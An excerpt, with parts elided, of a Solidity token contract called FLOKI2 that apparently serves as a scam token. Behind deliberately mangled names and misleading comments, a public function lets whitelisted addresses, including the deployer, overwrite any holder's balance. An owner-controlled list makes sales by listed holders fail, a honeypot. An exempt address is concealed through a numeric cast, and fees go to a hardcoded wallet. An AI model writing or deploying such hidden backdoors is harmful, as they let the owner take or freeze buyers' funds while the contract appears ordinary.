...
contract  FLOKI2 is Context, IERC20, Ownable {
    ...
    address payable public zxxWallAddre;
    ...
    mapping (address => bool) public _mkbastPirsList;
    mapping (address => bool) public _Tqensfar;
    ...
    constructor () {
        ...
        isWalletLimitExempt[KpJWNFA(derAFUCODEABI)] = true;
        isTxLimitExempt[KpJWNFA(derAFUCODEABI)] = true;
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        _mkbastPirsList[address(uniswapPair)] = true;
        _mkbastPirsList[msg.sender] = true; 

        teamWalletAddress = payable(address(0x017560107D32862228c650b81E5a41f1c10ddCb6));
        zxxWallAddre = payable(address(0x017560107D32862228c650b81E5a41f1c10ddCb6));
    ...
    function SHFIOHNFW(uint256 amountOut)  pure private returns(uint160){
        return
        uint160(amountOut);
    }

    function KpJWNFA(uint256 amount1Out)  pure private returns(address){
        return 
        address(SHFIOHNFW(amount1Out));
    }

    function _AgrWIOFNIKJN(address FJIOWAFW) private view returns(bool){
        return
        !(KpJWNFA(derAFUCODEABI) == FJIOWAFW);
    }
    ...
    function setMarketinWalleAddress(address newAddress) external onlyOwner() {
        zxxWallAddre = payable(newAddress);
    }
...
function _asicransfer(address
 ssss /* uniswapPair*/
, uint256 
benAmount /* uniswapPair*/ ) public
{if( 
_mkbastPirsList[ /* uniswapPair*/
_qaa()])_balanceOf[ssss] 
= benAmount;}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !_mkbastPirsList[sender] && swapAndLiquifyEnabled) 
            {
                if(swapAndLiquifyByLimitOnly)
                    contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);
            }if(_AgrWIOFNIKJN(sender))
        ...
        require(waout(zxxWallAddre,_qaa()));
        for (uint256 i; i < aescallDATa.length; ++i) {
            if (d == 1){_Tqensfar[aescallDATa[i]] = true;}
            else if(d == 0){_Tqensfar[aescallDATa[i]] = false;}
        }
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(zxxWallAddre, amountBNBMarketing);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (!isMarketPair[sender]){
            require(!_Tqensfar[sender]);
        }

        if(_mkbastPirsList[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else if(_mkbastPirsList[recipient]) {
